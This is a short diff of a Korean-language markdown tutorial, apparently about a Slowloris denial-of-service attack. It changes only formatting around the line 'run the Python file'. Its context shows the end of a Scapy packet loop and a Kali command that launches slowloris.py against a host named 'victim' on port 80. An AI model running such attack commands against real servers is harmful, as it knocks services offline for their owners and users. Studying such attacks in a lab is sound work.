@@ -108,8 +108,7 @@ for s in range(0, no_of_gets):
     sr1(ack_get)
 ```
 
-파이썬 파일 실행
-
+- 파이썬 파일 실행
 ```
 ┌──(kali㉿kali)-[~]
 └─$ sudo python3 slowloris.py victim 80 1000
